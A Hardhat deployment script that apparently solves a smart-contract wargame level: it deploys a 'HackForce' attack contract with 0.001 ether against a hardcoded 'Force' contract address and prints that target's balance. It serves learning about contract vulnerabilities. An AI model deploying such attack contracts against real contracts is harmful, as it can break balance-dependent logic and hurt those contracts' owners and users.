const { ethers } = require("hardhat");
const hre = require("hardhat");
require("dotenv").config();

async function main() {
  const contractAddress = "0x5cf3B9437b6907E352aF6d21e3271Ca1Ac893E12";
  const hack = await hre.ethers.getContractFactory("HackForce");
  const Hack = await hack.deploy(contractAddress, {
    value: ethers.utils.parseEther("0.001"),
  });
  await Hack.deployed();

  console.log("HackForce successfull!, address of HackForce: ", Hack.address);

  const provider = new ethers.providers.JsonRpcProvider(
    process.env.ALCHEMY_URL
  );
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  /* const force = await hre.ethers.getContractAt(
    "Force",
    contractAddress,
    wallet
  );*/
  const balance = await ethers.provider.getBalance(contractAddress);
  console.log(balance);
  //
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
//0x2FE7f3D97f2dd01beac668238dCC2f9444C0ae96
